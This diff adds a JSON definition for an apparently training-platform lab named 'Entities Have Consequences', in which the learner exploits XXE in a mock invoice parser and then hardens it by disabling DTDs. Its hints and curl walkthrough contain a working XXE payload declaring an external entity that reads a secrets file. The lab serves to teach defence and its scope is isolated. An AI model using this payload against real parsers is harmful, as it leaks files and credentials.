@@ -1,0 +1,147 @@
+{
+  "schemaVersion": 1,
+  "id": "xxe-document-parser",
+  "version": "1.0.0",
+  "status": "published",
+  "title": "Entities Have Consequences",
+  "subtitle": "XXE against Arclight's invoice parser",
+  "category": "API Security",
+  "difficulty": "Intermediate",
+  "estimatedMinutes": 25,
+  "skills": [
+    "XXE",
+    "XML parsers",
+    "DTD handling",
+    "Secure parsing"
+  ],
+  "summary": "Arclight normalises XML invoices and resolves external entities. Read the billing service's secret file, then disable DTD processing while keeping ordinary invoices working.",
+  "scenario": "A supplier integration posts XML invoices to Arclight. The parser still expands external entities, and the service's document store contains a billing token. Exploit the parser, then harden it.",
+  "prerequisites": [
+    "Basic XML",
+    "curl"
+  ],
+  "learningObjectives": [
+    "Explain how external entity expansion reads local files",
+    "Craft a minimal XXE document",
+    "Disable DTD processing safely"
+  ],
+  "authorizedScope": "Only the Arclight training parser. Tokens are synthetic.",
+  "riskSummary": "XXE reads local files, reaches internal services and can exhaust memory. Historically it has leaked cloud credentials from production parsers.",
+  "remediation": "Disable DTDs and external entities, prefer a parser profile without entity expansion, and keep XML libraries patched.",
+  "conclusion": "You read a protected document through entity expansion and then blocked DTDs without breaking normal invoices.",
+  "baseXp": 140,
+  "workspace": {
+    "image": "cipherforge/workspace:1.2.0",
+    "tools": [
+      "curl",
+      "jq",
+      "python3",
+      "labctl"
+    ]
+  },
+  "services": [
+    {
+      "name": "app",
+      "role": "target",
+      "app": "xxe-document-parser/app/server.mjs",
+      "ports": [
+        {
+          "port": 8080,
+          "protocol": "http",
+          "published": true,
+          "name": "web"
+        }
+      ],
+      "health": {
+        "kind": "http",
+        "path": "/api/health",
+        "expectStatus": 200,
+        "expectBody": "arclight-parser",
+        "timeoutSeconds": 30
+      },
+      "flagObjectives": [
+        "xxe-flag"
+      ]
+    }
+  ],
+  "resources": {
+    "cpus": 0.5,
+    "memoryMb": 320,
+    "pids": 96,
+    "writableDiskMb": 64,
+    "maxMinutes": 45,
+    "idleTimeoutMinutes": 20
+  },
+  "network": {
+    "outbound": "deny",
+    "internalPorts": [
+      8080
+    ]
+  },
+  "objectives": [
+    {
+      "id": "xxe-flag",
+      "title": "Read the billing secret",
+      "description": "Submit a document that declares an external entity pointing at /srv/arclight/secrets/billing.env and submit the token it resolves.",
+      "validation": {
+        "type": "flag",
+        "objectiveKind": "flag",
+        "xp": 55
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "A DOCTYPE may declare `<!ENTITY secret SYSTEM \"file:///srv/arclight/secrets/billing.env\">` and reference `&secret;` inside the body.",
+          "xpPenalty": 5
+        }
+      ]
+    },
+    {
+      "id": "disable-dtd",
+      "title": "Disable DTDs",
+      "description": "Apply the hardening policy. The live check posts the XXE document (must be rejected) and a normal invoice (must still parse).",
+      "validation": {
+        "type": "check",
+        "objectiveKind": "check",
+        "xp": 70,
+        "validator": "doctype-rejected",
+        "criteria": [
+          "XXE document rejected",
+          "no token in any response",
+          "ordinary invoices still parse"
+        ]
+      },
+      "hints": [
+        {
+          "id": "h1",
+          "text": "Apply `{\"allowDoctype\": false}` with `labctl policy apply -`.",
+          "xpPenalty": 5
+        }
+      ]
+    }
+  ],
+  "validators": [
+    "doctype-rejected"
+  ],
+  "provisioner": {
+    "script": "xxe-document-parser/provision.mjs",
+    "timeoutSeconds": 45
+  },
+  "walkthrough": [
+    {
+      "title": "Normal invoice",
+      "body": "Confirm the parser accepts a plain document.",
+      "snippet": "curl -s -X POST -H 'content-type: application/xml' --data '<invoice><line>consulting</line></invoice>' $CF_TARGET_URL/api/documents/parse | jq"
+    },
+    {
+      "title": "Declare the entity",
+      "body": "Point an external entity at the secrets file and reference it.",
+      "snippet": "curl -s -X POST -H 'content-type: application/xml' --data '<?xml version=\"1.0\"?><!DOCTYPE invoice [<!ENTITY s SYSTEM \"file:///srv/arclight/secrets/billing.env\">]><invoice><line>&s;</line></invoice>' $CF_TARGET_URL/api/documents/parse | jq"
+    },
+    {
+      "title": "Block DTDs",
+      "body": "Reject doctype declarations outright.",
+      "snippet": "echo '{\"allowDoctype\": false}' | labctl policy apply -"
+    }
+  ]
+}
